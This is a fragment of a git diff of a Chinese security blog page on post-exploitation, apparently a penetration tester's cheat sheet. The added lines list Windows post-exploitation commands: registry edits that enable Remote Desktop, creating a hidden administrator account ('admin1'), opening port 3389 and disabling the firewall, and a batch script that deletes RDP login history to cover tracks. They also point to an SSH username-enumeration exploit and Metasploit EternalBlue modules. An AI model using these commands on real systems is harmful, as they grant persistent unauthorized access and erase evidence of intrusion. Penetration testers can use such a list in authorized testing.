class="line">SSH用户名爆破[CVE-2018-15473](https://github.com/Rhynorater/CVE-2018-15473-Exploit)</span><br><span class="line"></span><br><span class="line">ms17-010：</span><br><span class="line"></span><br><span class="line">msf扫描：auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">利用：exploit/windows/smb/ms17_010_eternalblue       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[redis未授权访问](https://blog.csdn.net/fly_hps/article/details/80937837)</span><br><span class="line"></span><br><span class="line">注册表开3389：</span><br></pre></td></tr></table></figure>
+
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册表查看远程桌面端口是多少（结果是16进制的）</span><br></pre></td></tr></table></figure>
+
+<p>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加用户</span><br></pre></td></tr></table></figure>
+
+<p>net user admin1 admin1 /add &amp; net localgroup administrators admin1 /add</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加允许3389到防火墙</span><br></pre></td></tr></table></figure>
+
+<p>netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关闭防火墙</span><br></pre></td></tr></table></figure>
+
+<p>netsh firewall set opmode mode=disable</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[内网中间人攻击](http://www.myh0st.cn/index.php/archives/230/)</span><br><span class="line"></span><br><span class="line">3389登录记录清除</span><br></pre></td></tr></table></figure>
+
+<p>@echo off<br>@reg delete “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default” /va /f<br>@del “%USERPROFILE%\My Documents\Default.rdp” /a<br>@exit</p>
+<pre><code>### [传输文件技巧](https://paper.seebug.org/834/)
+
+
+
+
+
+</code></pre>
       
 
       
@@ -767,7 +359,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/19/漏洞利用/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/19/后渗透/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -779,6 +371,16 @@
 </article>
 
   
+<nav id="article-nav">
+  
+  
+    <a href="/2019/08/19/信息收集/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -978,7 +580,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
   	  	
-  	  		<div class="aboutme-wrap" id="js-aboutme">很惭愧&lt;br&gt;&lt;br&gt;只做了一点微小的工作&lt;br&gt;谢谢大家</div>
+  	  		<div class="aboutme-wrap" id="js-aboutme">安全&lt;br&gt;&lt;br&gt;渗透测试工程师&lt;br&gt;</div>
   	  	
     	</section>
     
